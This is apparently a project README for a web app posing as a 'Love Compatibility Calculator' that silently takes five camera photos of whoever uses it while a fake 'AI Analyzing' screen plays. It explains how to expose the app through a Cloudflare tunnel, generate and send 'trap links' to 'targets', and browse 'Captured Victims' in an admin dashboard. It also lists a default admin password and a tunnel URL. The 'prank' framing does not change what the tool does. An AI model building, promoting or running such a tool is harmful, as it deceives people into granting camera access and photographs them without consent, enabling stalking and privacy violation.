# Auto-Photo-Capture-model-
It is easy to Work and prank your friends, not for bad

# 💘 Secret Matcher — Auto-Capture Prank App

A stealthy, full-stack Next.js web application disguised as a "Love Compatibility Calculator". When a target enters their name and crush's name, the app silently requests camera access and captures **5 high-resolution photos** in the background — while a fake "AI Analyzing..." screen plays. All data and images are stored privately on your local device.

---

## 🚀 Features

| Feature | Details |
|---|---|
| 🎭 Decoy UI | Premium glassmorphic Love Matcher interface |
| 📸 Silent Capture | 5 background HD photos (720p) via invisible video stream |
| 📱 Mobile Ready | Optimized for iOS & Android with "Instant Gesture" camera logic |
| 🔗 Persistent Links | Links stay active for multiple users until you manually kill them |
| 💾 Local Storage | Images saved to `/public/captures/` on your device |
| 🔐 Admin Dashboard | Full password-protected control panel (Accessible via PC & Phone) |
| ✏️ Edit Records | Fix victim names directly from the dashboard |
| 🗑️ Delete Records | Removes DB entry AND physical image files |
| 🔗 Share | Copy fun summaries to clipboard or native share |
| ❌ Deactivate Links | Manually kill any active link before it's used |
| 🔑 Change Password | Update admin password directly from the dashboard |

---

## 🛠️ How to Start the App

You need **two separate terminal windows** running simultaneously.

### Terminal 1 — Start the Local Server
```bash
npm run dev
```
Wait until it says `✓ Ready on http://localhost:3000`.

### Terminal 2 — Open the Internet Tunnel (to reach anyone globally)
```bash
npx --yes cloudflared tunnel --url http://localhost:3000
```
Look for the link ending in `trycloudflare.com`:
```
Your quick Tunnel has been created! Visit it at:
https://xxxx-xxxx-xxxx.trycloudflare.com
```

> [!NOTE]
> The app is now **fully dynamic**. You no longer need to update any hardcoded URLs. The Admin Dashboard and Trap Links will automatically work using whatever domain the tunnel provides!


## ⚙️ How to Use the App

1. **Access the Admin Panel**: 
   - On your PC: [http://localhost:3000/admin]
   - On your Phone: Open the [https://drives-stomach-aquarium-lee.trycloudflare.com/admin]link from Terminal 2.
2. **Log in**: Use your admin password (default: `@Praveen123`).
3. **Generate Link**: Click **"+ Generate Trap Link"** — the dashboard instantly creates a shareable public link.
4. **Send the Link**: Share it with your targets.
5. **View Results**: Once they complete the form, 5 photos are captured and appear in your dashboard instantly.
6. **Multi-use**: The link stays active until you manually click **"Deactivate"** in the dashboard.

---

## 🔑 Admin Dashboard Guide

| Action | How |
|---|---|
| **Login** | Enter admin password at `/admin` |
| **Generate Link** | Click `+ Generate Trap Link` button |
| **View Captures** | Scroll the "Captured Victims" panel |
| **Download Photos** | Click any photo thumbnail to save it |
| **Edit Names** | Click ✏️ icon on a capture card |
| **Delete Record** | Click 🗑️ icon (also deletes image files!) |
| **Share Summary** | Click 🔗 icon to copy fun message |

| **Deactivate Link** | Click red `Deactivate` button next to any active link |
| **Change Password** | Scroll to `🔐 Change Admin Password` panel at bottom |

---

## 📁 File Storage

Captured images are saved to:
```
<project_root>/public/captures/
```
Each filename is in the format: `<linkId>_<index>.jpg`

---

## 🔐 Security Notes

- All data is **100% local** — nothing is sent to any cloud service.
- The admin dashboard is password protected and stored in `local_data.sqlite`.
- **Global Access**: You can manage your results from your phone using the Cloudflare URL while away from your PC.
- Default password: `@Praveen123` — **change this immediately from the dashboard!**

---

## 🧰 Tech Stack

- **Framework**: Next.js (App Router)
- **Database**: SQLite (`local_data.sqlite`)
- **Tunnel**: Cloudflare Quick Tunnel

- **Styling**: Tailwind CSS + Custom glassmorphism
